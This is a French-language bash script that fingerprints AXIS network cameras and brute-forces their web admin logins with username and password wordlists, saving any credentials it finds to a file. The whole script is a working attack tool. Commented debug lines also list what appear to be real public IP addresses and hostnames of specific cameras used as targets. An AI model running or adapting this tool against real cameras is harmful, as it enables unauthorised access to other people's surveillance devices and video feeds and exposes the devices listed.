#!/bin/bash
# CHORFA Alla-eddine
# h4ckr213dz@gmail.com
# http://dino213dz.free.fr
############################################################################################
ab_auteur='CHORFA Alla-eddine'
ab_date_creation='25.07.2019'
ab_date_maj='26.07.2019'
ab_ver='0.9'
ab_contact='h4ckr213dz@gmail.com'
ab_web='http://dino213dz.free.fr'
############################################################################################

mdp_wordlist='./wordlists/axis_mdp_light.txt'
#mdp_wordlist='/root/Documents/Wordlists/SecLists/Passwords/openwall.net-all.txt'
users_wordlist='./wordlists/axis_users_light.txt'
fichier_mdp_trouve_default='./crcked/AXIS_~MODELE~_~IP~_password.txt'
fichier_mdp_trouve=$fichier_mdp_trouve_default

liste_modeles_verifies=("205" "206" "207" "207W" "214" "2100" "2120" "2401+" "M1004-W" "M1011-W" "M1114" "M3026" "M7011" "P1347" "P3354" "P3367" "P5532-E" "P5534-E" "P7214" "Q6032-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q1765-LE")
tmp='/tmp/axis.html'
nb_mdp=$(cat $mdp_wordlist|wc -l)
nb_users=$(cat $users_wordlist|wc -l)
succes='Administration'
echec='Unauthorized'
banniere='X19fX19fX18gIC5fX18gX19fX19fXyAgIF9fX19fX19fICAgX19fX19fX18gIF9fX19fX19fX19fXyBfX19fX19fXyAgX19fX19fX19fXwpcX19fX19fIFwgfCAgIHxcICAgICAgXCAgXF9fX19fICBcICBcX19fX18gIFwvXyAgIFxfX19fXyAgXFxfX19fX18gXCBcX19fXyAgICAvCiB8ICAgIHwgIFx8ICAgfC8gICB8ICAgXCAgLyAgIHwgICBcICAvICBfX19fLyB8ICAgfCBfKF9fICA8IHwgICAgfCAgXCAgLyAgICAgLyAKIHwgICAgYCAgIFwgICAvICAgIHwgICAgXC8gICAgfCAgICBcLyAgICAgICBcIHwgICB8LyAgICAgICBcfCAgICBgICAgXC8gICAgIC9fIAovX19fX19fXyAgL19fX1xfX19ffF9fICAvXF9fX19fX18gIC9cX19fX19fXyBcfF9fXy9fX19fX18gIC9fX19fX19fICAvX19fX19fXyBcCiAgICAgICAgXC8gICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICAgXC8gICAgICAgICAgIFwvICAgICAgICBcLyAgICAgICAgXC8K'

rouge='\033[1;31m'
jaune='\033[1;33m'
marron='\033[0;33m'
vert='\033[1;32m'
cyan='\033[1;36m'
bleu='\033[1;34m'
magenta='\033[1;35m'
blanc='\033[1;37m'
reset='\033[0m'

mdp_trouve=''
echec_js=''
total_fait=0
modeles_verifie=''
urlforced=''

args=("$@")
nb_args=$#
for no_arg in $(seq 0 $nb_args); do
	valeur=${args[$no_arg]}
	if [ ${#valeur} -gt 0 ];then
		if [ "$valeur" = "--cible" ];then
			ip=${args[$(($no_arg+1))]}
			ip=${ip/https:\/\//}
			ip=${ip/http:\/\//}
			ip=${ip//\//}
		fi
		if [ "$valeur" = "--url" ];then
			urlforced='OUI'
			targeturi=${args[$(($no_arg+1))]}
			if [ "${targeturi:0:1}" = "/" ]; then
				url="http://$ip$targeturi"			
			else
				url="http://$ip/$targeturi"
			fi
		fi
		if [ "$valeur" = "--usernames" ];then
			users_wordlist=${args[$(($no_arg+1))]}
		fi
		if [ "$valeur" = "--passwords" ];then
			mdp_wordlist=${args[$(($no_arg+1))]}
		fi
		if [ "$valeur" = "--export" ];then
			fichier_mdp_trouve=${args[$(($no_arg+1))]}
		fi
		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
			echo -e "\nDESCRIPTION:"
			echo -e " Brute force les web interface des cameras AXIS.\n Necessite un fichier mdp et un fichier usernames :\n\t1. $mdp_wordlist\n\t2. $mdp_wordlist"
			echo -e "\nSYNTAXE:\n $> $0 [--cible IP|IP:PORT] [--passwords fichier_pass.txt] [--usernames fichier_usernames.txt] [--export fichier_sauvegarde_mdp.txt] [--url /admin/admin.shtml	]"
			echo -e "\nEXEMPLES:"
			echo -e " $> $0 --cible 192.23.36.254:83 "
			echo -e " $> $0 --cible 192.23.36.254:83 --passwords ./axis_pass.txt --usernames ./axis_usernames.txt "
			echo -e " $> $0 --cible 192.23.36.254:83 --export mdp_axis_test.txt]"
			echo -e "\nA PROPOS:\n Auteur: $ab_auteur\n Edité le: $ab_date_creation\n Version: $ab_ver\n Contact: $ab_contact\n Web: $ab_web"
			exit
		fi
	fi
done
#debug forcing
#ip='193.251.72.244:8083' #AXIS 206 Caméra Réseau
#ip='lysestabournie.axiscam.net:8080' #AXIS 205
#ip='59.126.168.115:8080' #root/pass modele AXIS 2120
#ip='157.161.148.19' # modele AXIS 2100
#ip='80.14.185.186' # modele : AXIS Q6054-E Mk II View
#ip='129.186.130.3' # modele : AXIS Q6055-E Network Camera
#ip='78.193.5.67:82' #AXIS M1011-W Network Camera
#ip='' #


if [ ${#ip} -eq 0 ];then
	echo -e "ERREUR!"
	echo -e " Vous devez specifier une cible avec l'argument '--cible'.\nExemple: $0 --cible 127.18.27.33"
	echo -e " Vous pouvez afficher l'aide avec l'argument '--help' ou '-h'."
	exit
fi


function fullModeleDetect {

	ip_cam=$1	
	modele_complet=$(curl -k -s "http://$ip_cam/view/index.shtml" -d "test=test" |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)

	if [ "$modele_complet" = " " ] ||  [ "$modele_complet" = "" ] ;then
		modele_complet=$(curl -k -s "http://$ip_cam/" -d "test=test" |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)
	fi

	if [ "$modele_complet" = " " ] ||  [ "$modele_complet" = "" ]  ||  [ "$modele_complet" = "Unauthorized" ] ;then
		modele_complet=$(curl -k -s "http://$ip_cam/view/index2.shtml?newstyle=&cam=" -d "test=test" |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)
	fi

	if [ ${#modele_complet} -gt 0 ] ;then
		if [ ${modele_complet:0:5} = "Index" ] ;then
			modele_complet=$(curl -k -s "http://$ip_cam/view/view.shtml?id=354&imagepath=%2Fmjpg%2Fvideo.mjpg&size=1" -d "test=test" |egrep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)
		fi
	fi
	
	if [ "$modele_complet" = " " ] ||  [ "$modele_complet" = "" ]  ;then
		modele_complet=$(curl -k -s "http://$ip_cam/admin/admin.shtml" -d "test=test" |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)
	fi

	if [ "$modele_complet" = " " ] ||  [ "$modele_complet" = "" ] ;then
		modele_complet='AXIS modeleNonDetecte versionNonDetecte'
	fi

	echo $modele_complet
	}


function modeleExtract {

	#pb ici : les modeles ne sont plus corrects suite à la creation des fonctions
	m_c_cam="$1"
	m_c_cam=$(echo -e "$m_c_cam"|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
	m_c_cam=${m_c_cam/.*[aA][xX][iI][sS]/axis}
	echo -e "$m_c_cam"

	}

function versionDetect {

	v_c_cam=$1	
	v_c_cam=$(echo $v_c_cam|rev|cut -d " " -f 1|rev)
	echo $v_c_cam

	}

function urlModele {

	ip_cam=$1	
	modele_cam=$2	

	# modele par defaut : le plus commun	
	url_cam="http://$ip_cam/operator/basic.shtml"

	# old generation
	if  [ "$modele_cam" = "2100" ] || [ "$modele_cam" = "2120" ] || [ "$modele_cam" = "2401+" ];then 
		url_cam="http://$ip_cam/admin/admin.shtml" 
	fi
	# AXIS Q6055-E
	if [ "$modele_cam" = "Q6054-E" ] ;then 
		url_cam="http://$ip_cam/axis-cgi/admin/paramlist.cgi"
	fi

	# AXIS P3367
	#if [ "$modele_cam" = "P3367" ] ;then 
	#	url_cam="http://$ip_cam/operator/videostream.shtml?id=1312"
	#fi

	# Modele innaccessible
	if [ "$modele_cam" = "Unauthorized" ] || [ "$modele_cam" = "Unauthorized" ];then 
		url_cam="http://$ip_cam/operator/basic.shtml"
	fi

	# Page introuvable
	if [ "$modele_cam" = "Not" ];then 
		url_cam="http://$ip_cam/admin/admin.shtml"
	fi

	echo $url_cam
	}

#DEBUG: echo -e "~~$vert$modele_complet$reset~~$magenta$fichier_mdp_trouve$reset~~"
clear

echo -e $jaune
echo $banniere|base64 -d
echo -e "                                                  $ab_auteur - Ver. $ab_ver"
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"

echo -e "$jaune\nANALYSE:"

echo -e "$jaune[+] IP cible : $cyan$ip"
echo -en "$jaune[+] Modeles testés :"
for mod in ${liste_modeles_verifies[*]}; do
	echo -en "$cyan $mod$jaune,"
done
echo -e "$vert ("${#liste_modeles_verifies[*]}" au total)"

echo -en "$jaune[+] Detection du modele de la camera en cours...$cyan"
#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
x_modele_complet=$(fullModeleDetect $ip)
modele=$(echo $x_modele_complet|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
modele=${modele/.*[aA][xX][iI][sS]/axis}

#echo -e $magenta$x_modele_complet
if [ "$modele_complet" != "AXIS modeleNonDetecte versionNonDetecte" ]; then
	for mod in ${liste_modeles_verifies[*]}; do
		if [ "$mod" = "$modele" ];then
			modeles_verifie="OUI"
		fi
	done

	if [ "$modeles_verifie" = "OUI" ];then
		echo -e "$vert$modele, testé et vérifié! $marron;)"
	else
		echo -e "$rougeCe modele $modele n'a pas été testé! $marron:/"
	fi
else
	echo -e "$magenta Le modele n'a pas été reconnu! $marron:/"
fi

echo -e "$jaune[+] Detection de la version du firmware...$cyan"
#version=$(versionDetect $modele_complet) #pb resultats erronés
version=$(echo $modele_complet|rev|cut -d " " -f 1|rev|egrep -o [0-9.,].*)


echo -e "$jaune[+] Préparation de l'environnement...$cyan"
if [ "$urlforced" != "OUI" ]; then 
	url=$(urlModele $ip $modele)
fi
fichier_mdp_trouve=${fichier_mdp_trouve/~MODELE~/$modele}
fichier_mdp_trouve=${fichier_mdp_trouve/~IP~/$ip}


echo -e "$jaune\nINFORMATIONS:"
echo -e "$jaune[+] IP:$cyan $ip"
echo -en "$jaune[+] Modele:$cyan $modele"
if [ ${#version} -gt 0 ]; then 
	echo -en "$cyan (Firmware ver. $magenta$version$cyan)"
else
	echo -en "$cyan "
fi
if [ "$modeles_verifie" = "OUI" ]; then 
	echo -e $cyan" ("$vert"modele reconnu"$cyan")"
else
	echo -e $cyan" ("$rouge"modele non verifié"$cyan")"
fi
echo -e "$jaune[+] URL Cible:$cyan $url"
echo -e "$jaune[+] Password list:$cyan $mdp_wordlist $jaune"
echo -e "$jaune[+] Usernames list:$cyan $users_wordlist $jaune"

if [ "$fichier_mdp_trouve" != "$fichier_mdp_trouve_default" ];then
	echo -e "$jaune[+] Fichier export:$cyan $fichier_mdp_trouve $jaune"
fi

echo -e "$jaune[+] Total usernames:$cyan$nb_users"
echo -e "$jaune[+] Total passwords:$cyan$nb_mdp"
echo -e "$jaune[+] Nombre de combinaisons:$cyan"$(($nb_users*$nb_mdp))


echo -e "\n$jaune""TRAITEMENT:"

while read user; do 
	while read mdp; do 
		total_fait=$(($total_fait+1))
		echo -en "$jaune[$total_fait] $user/$mdp : "
		
		#curl -k -s "$url" -d "username=root&passwod=$mdp" -o $tmp
		curl -k -s "$url" --user "$user:$mdp"  -d "test=test" -o $tmp


		test_unauthorized=$(cat $tmp |grep --binary-files=text -i $echec)
		test_javascript=$(cat $tmp |egrep --binary-files=text -i 'enable JavaScript')
		test_administration=$(cat $tmp |egrep --binary-files=text -i 'administration tools')
		test_configuration=$(cat $tmp |egrep --binary-files=text -i 'Basic Configuration')
		#echo -e "###$magenta$test/$test_javascript/"$(cat $tmp)"$reset###"
		#cat $tmp|grep -i '<title'
		#si le titre contien "unhotorized"
		if [ ${#test_unauthorized} -gt 0 ];then
			echo -e $rouge"\tECHEC!"
		else			
			#sinon on considere qu'on a passé la porte :D
			if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
				echo -e $vert"\tSUCCES!"
				mdp_trouve='OUI'
				break
			else					
				#si la page contient "enable javascript"
				if [ ${#test_javascript} -gt 0 ];then
					echo -e $rouge"\t ECHEC: Necessite Javascript. Version En cours de developpement!"
					echec_js="OUI"
					break
				else
					echo -e $vert"\tSUCCES!"
					mdp_trouve='OUI'
					break
					
				fi

			fi
		fi

	done < $mdp_wordlist
	if [ "$mdp_trouve" = "OUI" ] || [ "$echec_js" = "OUI" ]; then
		break
	fi
done < $users_wordlist

if [ "$mdp_trouve" = "OUI" ]; then
	if [ "$fichier_mdp_trouve" = './crcked/AXIS_~MODELE~_~IP~_password.txt' ];then
		echo $(mkdir "./crcked" 2>&1) 1>/dev/null
	fi
	echo -e "$user/$mdp" >> $fichier_mdp_trouve
fi

echo -e "$jaune\nRESUME:"

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune[+] BRAVO:$cyan On l'a trouvé en $vert$total_fait$cyan essais!"
	echo -e "$jaune[+] EXPORT:$cyan Les informations d'identification ont été stockées ici : $vert$fichier_mdp_trouve"
else
	if [ "$echec_js" = "OUI" ]; then		
		echo -e "$jaune[+] M****:$cyan Cette interface web axis nécessite javascript. $marron:'("
		echo -e "$jaune[+] INFO:$cyan Version javascript en cours de dev $marron;)"
	else
		echo -e "$jaune[+] M****:$cyan $total_fait essais sans trouver $marron:'("
		echo -e "$jaune[+] ASTUCE:$cyan Ajoute des logins et des mdp aux fichiers wordlist $marron;)"
	fi
fi




echo -e $reset
